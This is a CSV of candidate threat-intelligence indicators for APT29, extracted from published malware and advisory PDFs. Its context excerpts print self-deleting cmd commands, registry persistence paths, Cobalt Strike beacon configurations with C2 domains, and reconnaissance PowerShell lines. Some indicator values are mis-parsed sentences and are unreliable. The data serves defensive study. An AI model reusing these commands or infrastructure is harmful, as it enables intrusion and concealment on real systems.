schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--apt29,artifact--sha256:0e710d404739ac488061eb1aa8dc78841be3c04857e2b9895bc4a51e86920fe4,observation--sha256:78e66fec8d3a7158147a0f42676212ec7c21ece31bed5867cf8f468780d968cf,file-name,winhttp.dll,winhttp.dll,candidate,,unknown,unknown,not-stated,,source--apt29--813411ec01acb3f6,APT29/CERT.PL/IoC_Reference_.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 9/11 Indicator Value Virtual disc container File Name Invite.iso File Size 6464KB MD5 1609bcb75babd9a3e823811b4329b3b9 SHA1 86dcdf623d0951e2f804c9fb4ef816fa5e6a22c3 SHA256 91b42488d1b8e5b547b945714c76c2af16b9566b35757bf055cec1fee9dff1b0 Indicator Value Legitimate executable used to load the malicious DLL File Name Invite.exe File Size 5380KB MD5 d2027751280330559d1b42867e063a0f SHA1 15511f1944d96b6b51291e3a68a2a1a560d95305 SHA256 35271a5d,
1.0.0,actor--apt29,artifact--sha256:0e710d404739ac488061eb1aa8dc78841be3c04857e2b9895bc4a51e86920fe4,observation--sha256:e2b2a477ee38e3407198f9e0b539e9060d0ab862e3f5718a43d1f8532ac25b09,file-name,winhttp.dll,winhttp.dll,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 32}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL QUARTERRIG | 32/36 Indicator Value Virtual disc container File Name Invite.iso File Size 6464KB MD5 1609bcb75babd9a3e823811b4329b3b9 SHA1 86dcdf623d0951e2f804c9fb4ef816fa5e6a22c3 SHA256 91b42488d1b8e5b547b945714c76c2af16b9566b35757bf055cec1fee9dff1b0 Indicator Value Legitimate executable used to load the malicious DLL File Name Invite.exe File Size 5380KB MD5 d2027751280330559d1b42867e063a0f SHA1 15511f1944d96b6b51291e3a68a2a1a560d95305 SHA256 35271a5,
1.0.0,actor--apt29,artifact--sha256:1291b1d2d3eb4fea0f6e7c4dba72398bc13ded7b25771adf35f50ef87fe84676,observation--sha256:43b6ab8216d100b2aa2562e3572300733649da58953d08ad30cb9fcdc7abe0fd,file-name,wp-assets.php,wp-assets.php,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 20}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group Depending on the analysis made on the TDS panel, the PTI Team believes that the traffic distribution is achieved by injecting the following malicious PHP and JavaScript codes into multiple legitimate websites. Injected code checks the host, referrer, and cookie headers for the expected values on every incoming request and sends an HTTP GET request to the hxxp://mwkh.adsprofitnetwork.com/wordpressComposerUpdate ?phpcid=250&php address by appending the &hn=%URL-ENCOD",
1.0.0,actor--apt29,artifact--sha256:fb93ab95c410c09ef76714ba65f2179dc2835f4ef38d03cf04346906e6913284,observation--sha256:8b88f5fc7792046f796bda11a8579bc78bd3b16198dc67c12d8fa8b23231944e,file-path,"%APPDATA_LOCAL%\7zaand creates the registry keyHKCU\Software\Microsoft\Windows\CurrentVersion\Run\7zawith a value of%APPDATA_LOCAL%\7za\7za.exe. This enables GraphicalNeutrinoto be executed again when thevictim machine is rebooted; however, in this particular sample, persistence is not established becausethe process filename isnovember_schedulexe.pdfinsteadof 7za.exe.","%APPDATA_LOCAL%\7zaand creates the registry keyHKCU\Software\Microsoft\Windows\CurrentVersion\Run\7zawith a value of%APPDATA_LOCAL%\7za\7za.exe. This enables GraphicalNeutrinoto be executed again when thevictim machine is rebooted; however, in this particular sample, persistence is not established becausethe process filename isnovember_schedulexe.pdfinsteadof 7za.exe",candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS victim’s machine. The DLL is written in C   and contains only 1 export function  DeviceAll), whichsimply returns when called. The actual malicious code is implemented in a thread that is spawned inDLLMain during the DLL’s initialization. Multiple anti-analysis and evasion techniques are usedthroughout the malware including API unhooking, dynamically resolving APIs, string encryption, andsandbox evasion. When GraphicalNeutrino starts a thread, it attempts to remove any API h",
1.0.0,actor--apt29,artifact--sha256:4cd15c356bd80556f081bf1fafbfda6d746b1d42759174a0a3031edaf294a5d7,observation--sha256:5abcc5bf50f597a59a02001249e8a2eb6803ba1677c6137eda77327c87a76308,file-path,%APPDATA_LOCAL%\photosand the registry keyHKCU\Software\Microsoft\Windows\CurrentVersion\Run\7za updateis then created with avalue of%APPDATA_LOCAL%\photos\photos_and_price.exe.,%APPDATA_LOCAL%\photosand the registry keyHKCU\Software\Microsoft\Windows\CurrentVersion\Run\7za updateis then created with avalue of%APPDATA_LOCAL%\photos\photos_and_price.exe,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS Once the shellcode is decrypted, it is indirectly spawned in a new thread byabusing FLS callbacks toobtain execution control as shown inFigure 14. Ratherthan specifying the shellcode’s address as thestart address for the thread, NTDLL’s rtlFlsAlloc is used instead. The rtlFlsAlloc function is used toallocatefiber local storageand takes a callbackfunction as an argument. GraphicalNeutrino creates thethread in a suspended state and updates the thread’s context to have the RCX",
1.0.0,actor--apt29,artifact--sha256:4e96fc99f35d07270e0a46d82ab3e837ce9096f838c6ace71216dfa65111d4fe,observation--sha256:2742c8604dc4a15d7fb849ba08ab13dbf2d13bcfa3d30d73103c56d589ff8397,file-path,%AppData%\Roaming\Mozilla\Firefox\,%AppData%\Roaming\Mozilla\Firefox\,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 103}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"102Easter Bunny The C2 server wants to select the sixth credential: :j65i 5 In this case, the result returned would be similar to the following: 0 http://10.0.0 1 admin1 test1234 1 http://10.0.0.1 admin2 test4567 2 http://10.0.0.1 admin3 test8901 3 http://10.0.0.1 admin4 testabcd 4 http://10.0.0.1 admin5 testABCD 5 > > http://10.0.0.1 admin6 testtest EXAMPLE OF USE This command allows you to update the connection mode (the default is authenticated proxy) stored in %AppData%\Roaming\Mozilla\Firef",
1.0.0,actor--apt29,artifact--sha256:f3d80a6f4237afe4d44b1c367d34788b7048891c78ce336a2417cf8b12a83bcf,observation--sha256:a94be23890881ebe00d5f530fcdd6616b7974cccbae5637f0837612f319a1c59,file-path,%SYSTEMROOT%\System32\cmd.exe /c ping 127.0.0.1 -n 35 & del /F %COMPUTERNAME%,%SYSTEMROOT%\System32\cmd.exe /c ping 127.0.0.1 -n 35 & del /F %COMPUTERNAME%,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 97}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"96Easter Bunny This command allows you to process a command sent from the C2 encoded in Base64. The encoded command will have a fixed structure so that it can be processed correctly: 3.4.3. 1 SEND COMMAND If we want it to be executed in iteration 2, we will encode the following in Base64: EXAMPLE OF USE 2 0 %SYSTEMROOT%\System32\cmd.exe /c ping 127.0.0.1 -n 35 & del /F %COMPUTERNAME% $(COMPUTERNAME) COMPUTERNAME Finally, it will send the following command: :mnxqsq MgowCiVTWVNURU1ST09UJVxTeXN0ZW0",
1.0.0,actor--apt29,artifact--sha256:708174192416d06893da092190b93baf07c6dffc146155b63e1f14c82878af66,observation--sha256:b5339eac275f3de73f1272a7b870c099b81e5eb874cb6946623ccf53f2f25521,file-path,%SystemRoot%\System32\cmd.exe /c “ping 127 .0.0.1 -n 30,%SystemRoot%\System32\cmd.exe /c “ping 127 .0.0.1 -n 30,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 100}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5299 If Subkey 6 does not exist, the function returns a default value with the following fields: <iteration> : Value between 5 and 20 (depending on each sample) <id> : 0 <command> : %SystemRoot%\System32\cmd.exe /c “ping 127 .0.0.1 -n 30 & del /F “%PROCESSOR_IDENTIFIER%” <EnvironmentVariableExpanded> : $(PROCESSOR_IDENTIFIER) <EnvironmentVariable> : PROCESSOR_IDENTFIER This command returns the Accept and User-Agent headers in the result. 3.4.3.4 GET HEADERS Illustration 94. GET HEAD",
1.0.0,actor--apt29,artifact--sha256:24ce9764d3052850018274e4fbdaa600dbf2875d3de2d59b236c4fdc650fd9d6,observation--sha256:0890d172f9c869282f25c868bbdd240510a087a1c308fb6312789dfb18867222,file-path,%SytemRoot%\System32\cmd.exe ping 127.0.0.1 -n 30 & del /F %EXE_PATH%,%SytemRoot%\System32\cmd.exe ping 127.0.0.1 -n 30 & del /F %EXE_PATH%,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 108}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB52107 This command allows you to execute the following command: %SytemRoot%\System32\cmd.exe ping 127.0.0.1 -n 30 & del /F %EXE_PATH% The purpose of the command is to delete the executable from the disk as a means of concealment. It matches the default command and will be executed if the command includes the argument “-die.” 3.4.3. 10 KILL Illustration 101. KILL function If execution fails, the result will display an error “key_word”. payload",
1.0.0,actor--apt29,artifact--sha256:80756818627a51ca63317f7efa29ca1efae5246a1e4200c6a4ab05e06195a01c,observation--sha256:91ecfad6699860485d1347f8fb6fd66880c4ee25cb094ad717440e3e7963f1a8,file-path,%windir%\\sysnative\\powercfg.exe,%windir%\\sysnative\\powercfg.exe,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 14/20 Cobalt Strike Configuration The listing below presents CobaltStrike beacon configuration: 1. { 2. ""BeaconType"": [ 3. ""HTTPS"" 4. ], 5. ""Port"": 443, 6. ""SleepTime"": 60000, 7. ""MaxGetSize"": 1398102, 8. ""Jitter"": 18, 9. ""C2Server"": ""communitypowersports.com,/owa/L7k2NQpwPNLq4C2dHD6TRv00GCH1axhaWv"", 10. ""HttpPostUri"": ""/owa/o9besAWTTVJKNeyrfOOy2tn-epXE7f"", 11. ""Malleable_C2_Instructions"": [ 12. ""Base64 URL-safe decode"" 13. ], 14. ""HttpGe",
1.0.0,actor--apt29,artifact--sha256:1df84cea6b8b9aff7d7ba4098e2bad21c14738bc1deb112e8fb769377e4a7969,observation--sha256:5f7b2d8e2f88390c38e60ee5de672bb4000a339c52ef093f1c826cf524ae5183,file-path,%windir%\\syswow64\\powercfg.exe,%windir%\\syswow64\\powercfg.exe,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 14/20 Cobalt Strike Configuration The listing below presents CobaltStrike beacon configuration: 1. { 2. ""BeaconType"": [ 3. ""HTTPS"" 4. ], 5. ""Port"": 443, 6. ""SleepTime"": 60000, 7. ""MaxGetSize"": 1398102, 8. ""Jitter"": 18, 9. ""C2Server"": ""communitypowersports.com,/owa/L7k2NQpwPNLq4C2dHD6TRv00GCH1axhaWv"", 10. ""HttpPostUri"": ""/owa/o9besAWTTVJKNeyrfOOy2tn-epXE7f"", 11. ""Malleable_C2_Instructions"": [ 12. ""Base64 URL-safe decode"" 13. ], 14. ""HttpGe",
1.0.0,actor--apt29,artifact--sha256:586def7b2aaa4862f3d1af15f5fb2b1b61bd1e9b1b6cfe152a4567e40c03bceb,observation--sha256:26f484165a34bca02648a22c46b81bc9804de481fb81f0db18394e9ad3f886e1,file-path,%windir%\sysnative\dllhost.exe,%windir%\sysnative\dllhost.exe,candidate,,unknown,unknown,not-stated,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 16/24 Payloads We have managed to collect two variants of payloads delivered via SNOWYAMBER: 1. CobaltStrike Beacon. Presented below is an extracted beacon configuration16: BeaconType - HTTPS Port - 443 SleepTime - 37000 MaxGetSize - 1048576 Jitter - 33 MaxDNS - Not Found PublicKey_MD5 - 92b602d1008704ef300d29ca014c6e21 C2Server - humanecosmetics.com,/category/noteworthy/6426- 7346-9789 UserAgent - Mozilla/5.0 (Windows NT 10.0; Win64; x64",
1.0.0,actor--apt29,artifact--sha256:f0b8f6d3a7e0b3d9deb8fdebfa5f4049797e1e67de34053675d6b69323fd32e7,observation--sha256:0df5db800a3f1706f5ed36f2bace4078b39ce0a0b84355c715cec3e25775f150,file-path,%windir%\sysnative\powercfg.exe,%windir%\sysnative\powercfg.exe,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 25}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL QUARTERRIG | 25/36 SSH_Banner - HttpGet_Verb - GET HttpPost_Verb - POST HttpPostChunk - 0 Spawnto_x86 - %windir%\syswow64\powercfg.exe Spawnto_x64 - %windir%\sysnative\powercfg.exe CryptoScheme - 0 Proxy_Config - Not Found Proxy_User - Not Found Proxy_Password - Not Found Proxy_Behavior - Use IE settings Watermark_Hash - Not Found Watermark - 1359593325 bStageCleanup - True bCFGCaution - False KillDate - 0 bProcInject_StartRWX - True bProcInject_UseRW,
1.0.0,actor--apt29,artifact--sha256:f0b8f6d3a7e0b3d9deb8fdebfa5f4049797e1e67de34053675d6b69323fd32e7,observation--sha256:a1991e48498ea81fea30c3b44f114459677507dd11e24f9a197e9aa46b8141b7,file-path,%windir%\sysnative\powercfg.exe,%windir%\sysnative\powercfg.exe,candidate,2021-10-01T00:00:00Z,month,known,same-record,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL QUARTERRIG | 26/36 CS Beacon #2 (March 2023) BeaconType - HTTPS Port - 443 SleepTime - 60000 MaxGetSize - 1048576 Jitter - 14 MaxDNS - Not Found PublicKey_MD5 - 4f28e1fdb295d14bfabc73bf0314a161 C2Server - gatewan.com,/c/msdownload/update/others/2021/10/se9fW4z8WJtmMyPQu UserAgent - Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 HttpPostUri - /c/msdownload/update/others/2021/10/PgYhuOrusI",
1.0.0,actor--apt29,artifact--sha256:f0b8f6d3a7e0b3d9deb8fdebfa5f4049797e1e67de34053675d6b69323fd32e7,observation--sha256:db004729f259650b5545c7dbbebb699cb69d6985ff4b2b3c6776ed180b7fcf9f,file-path,%windir%\sysnative\powercfg.exe,%windir%\sysnative\powercfg.exe,candidate,2021-10-08T00:00:00Z,day,known,same-record,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 28}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL QUARTERRIG | 28/36 CS Beacon #3 (April 2023) BeaconType - HTTPS Port - 443 SleepTime - 60000 MaxGetSize - 1048576 Jitter - 14 MaxDNS - Not Found PublicKey_MD5 - 4f28e1fdb295d14bfabc73bf0314a161 C2Server - gatewan.com,/c/msdownload/update/others/2021/10/8PaDBDxLtokI3eH8 UserAgent - Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 HttpPostUri - /c/msdownload/update/others/2021/10/PgYhuOrusIU",
1.0.0,actor--apt29,artifact--sha256:7eace05587f88d9bcc47c3258e0f22c814d2094e9e708e166549b404360d43bf,observation--sha256:98ecff8615ca3b8d6024fa4a657b3bdbd301d51b32d2f409c527db090ff352ae,file-path,%windir%\syswow64\dllhost.exe,%windir%\syswow64\dllhost.exe,candidate,,unknown,unknown,not-stated,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 16/24 Payloads We have managed to collect two variants of payloads delivered via SNOWYAMBER: 1. CobaltStrike Beacon. Presented below is an extracted beacon configuration16: BeaconType - HTTPS Port - 443 SleepTime - 37000 MaxGetSize - 1048576 Jitter - 33 MaxDNS - Not Found PublicKey_MD5 - 92b602d1008704ef300d29ca014c6e21 C2Server - humanecosmetics.com,/category/noteworthy/6426- 7346-9789 UserAgent - Mozilla/5.0 (Windows NT 10.0; Win64; x64",
1.0.0,actor--apt29,artifact--sha256:7963f0643b55a6ba044f1e4077bba2ab8c18b61263b18fafd65de74f179eb9e1,observation--sha256:81aec9ec24f2b5a579795c288cb1ee53cbfc9928396933a8c66eb2f4a48c28c5,file-path,%windir%\syswow64\powercfg.exe,%windir%\syswow64\powercfg.exe,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 25}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL QUARTERRIG | 25/36 SSH_Banner - HttpGet_Verb - GET HttpPost_Verb - POST HttpPostChunk - 0 Spawnto_x86 - %windir%\syswow64\powercfg.exe Spawnto_x64 - %windir%\sysnative\powercfg.exe CryptoScheme - 0 Proxy_Config - Not Found Proxy_User - Not Found Proxy_Password - Not Found Proxy_Behavior - Use IE settings Watermark_Hash - Not Found Watermark - 1359593325 bStageCleanup - True bCFGCaution - False KillDate - 0 bProcInject_StartRWX - True bProcInject_UseRW,
1.0.0,actor--apt29,artifact--sha256:7963f0643b55a6ba044f1e4077bba2ab8c18b61263b18fafd65de74f179eb9e1,observation--sha256:3e63e239db8a8c95bb977124315fb5c297c29eb056d5e4a270cbb9f3670a6201,file-path,%windir%\syswow64\powercfg.exe,%windir%\syswow64\powercfg.exe,candidate,2021-10-01T00:00:00Z,month,known,same-record,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL QUARTERRIG | 26/36 CS Beacon #2 (March 2023) BeaconType - HTTPS Port - 443 SleepTime - 60000 MaxGetSize - 1048576 Jitter - 14 MaxDNS - Not Found PublicKey_MD5 - 4f28e1fdb295d14bfabc73bf0314a161 C2Server - gatewan.com,/c/msdownload/update/others/2021/10/se9fW4z8WJtmMyPQu UserAgent - Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 HttpPostUri - /c/msdownload/update/others/2021/10/PgYhuOrusI",
1.0.0,actor--apt29,artifact--sha256:7963f0643b55a6ba044f1e4077bba2ab8c18b61263b18fafd65de74f179eb9e1,observation--sha256:e72493fbba0a57190dcdc26b33880fb139d48373f4a17cb54a3d65666a12b2cf,file-path,%windir%\syswow64\powercfg.exe,%windir%\syswow64\powercfg.exe,candidate,2021-10-08T00:00:00Z,day,known,same-record,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 28}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL QUARTERRIG | 28/36 CS Beacon #3 (April 2023) BeaconType - HTTPS Port - 443 SleepTime - 60000 MaxGetSize - 1048576 Jitter - 14 MaxDNS - Not Found PublicKey_MD5 - 4f28e1fdb295d14bfabc73bf0314a161 C2Server - gatewan.com,/c/msdownload/update/others/2021/10/8PaDBDxLtokI3eH8 UserAgent - Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 HttpPostUri - /c/msdownload/update/others/2021/10/PgYhuOrusIU",
1.0.0,actor--apt29,artifact--sha256:863d2cf8ebdc145db2a305464861a4662e863651fe0d80fb1d28630b7d36af2d,observation--sha256:d65116f9e97d1eea033a9b54f60ff56cbd26d87724ba185029e993f3300faf4d,file-path,C:\ Program Files (x86)\PatchManagementInstallation\Agent\12\Httpd,C:\ Program Files (x86)\PatchManagementInstallation\Agent\12\Httpd,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:0d55eaaaf34c67b93d5d8e9f18a6774fe940f012db44f97b05a60f8a90162813,observation--sha256:f30ca6a3dd61e5fbb6e661e0c45edff8ec784a32ac6add723a77af3f13105ce3,file-path,C:\ ProgramData\GFI\LanGuard 12\HttpdConfig\httpd.conf,C:\ ProgramData\GFI\LanGuard 12\HttpdConfig\httpd.conf,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:8a5b477b7de2f8bc45010ddff4a797f9cc31927e5241e1b11672d8c232f4ecb8,observation--sha256:2d49d19c7bf53f6a867e7325303a1cc7f1e3a913fdc102038b1001a5f03a09d2,file-path,C:\Intel\,C:\Intel\,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,14Easter Bunny Table 2. Location of artifacts NAME DIRECTORY Implant1.exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\ CoreCon\12.0\Target\wce400\x86\ Implant2.exe C:\ProgramData\Adobe\ARM\{a9e64e72-4bcd-e101-e557- 8036f50410e5}\ Implant3exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\12.0\Debugger\target\x86\ Implant4.exe C:\Program Files (x86)\Common Files\InstallShield\Driver\10\Intel 32\ Implant5.exe C:\ProgramData\Adobe\ARM\Reader_11.0. 12\1908\ Imp,
1.0.0,actor--apt29,artifact--sha256:b73c5e45b2cfc55c691e56aee56f8de14537514542fc84b0a513a3f18b7c7442,observation--sha256:8e6c0799bdb2fc9e44e4fdc66b2b66e3056f82dbe050d17147308a01f76a2b27,file-path,C:\Program Files (x86)\Common Files\InstallShield\Driver\10\Intel 32\,C:\Program Files (x86)\Common Files\InstallShield\Driver\10\Intel 32\,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,14Easter Bunny Table 2. Location of artifacts NAME DIRECTORY Implant1.exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\ CoreCon\12.0\Target\wce400\x86\ Implant2.exe C:\ProgramData\Adobe\ARM\{a9e64e72-4bcd-e101-e557- 8036f50410e5}\ Implant3exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\12.0\Debugger\target\x86\ Implant4.exe C:\Program Files (x86)\Common Files\InstallShield\Driver\10\Intel 32\ Implant5.exe C:\ProgramData\Adobe\ARM\Reader_11.0. 12\1908\ Imp,
1.0.0,actor--apt29,artifact--sha256:71480a36ca36b90207e4a2dcfdba16a7ced2050f79d7af37053d464befba2a2d,observation--sha256:b6f81d782308383740aba6ae4e50c3ada0e8c0c79f7f2bb92f7d12b186f6393c,file-path,C:\Program Files (x86)\Common Files\microsoft shared\Phone,C:\Program Files (x86)\Common Files\microsoft shared\Phone,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,14Easter Bunny Table 2. Location of artifacts NAME DIRECTORY Implant1.exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\ CoreCon\12.0\Target\wce400\x86\ Implant2.exe C:\ProgramData\Adobe\ARM\{a9e64e72-4bcd-e101-e557- 8036f50410e5}\ Implant3exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\12.0\Debugger\target\x86\ Implant4.exe C:\Program Files (x86)\Common Files\InstallShield\Driver\10\Intel 32\ Implant5.exe C:\ProgramData\Adobe\ARM\Reader_11.0. 12\1908\ Imp,
1.0.0,actor--apt29,artifact--sha256:540f54b48344a866a7639c1976b154fc76b0a2226c404d3421cc51d1f11d753a,observation--sha256:b1bcd323197be8b353251d739dad5d3486f020bba69db38efa6e6183e55918fb,file-path,C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\,C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,14Easter Bunny Table 2. Location of artifacts NAME DIRECTORY Implant1.exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\ CoreCon\12.0\Target\wce400\x86\ Implant2.exe C:\ProgramData\Adobe\ARM\{a9e64e72-4bcd-e101-e557- 8036f50410e5}\ Implant3exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\12.0\Debugger\target\x86\ Implant4.exe C:\Program Files (x86)\Common Files\InstallShield\Driver\10\Intel 32\ Implant5.exe C:\ProgramData\Adobe\ARM\Reader_11.0. 12\1908\ Imp,
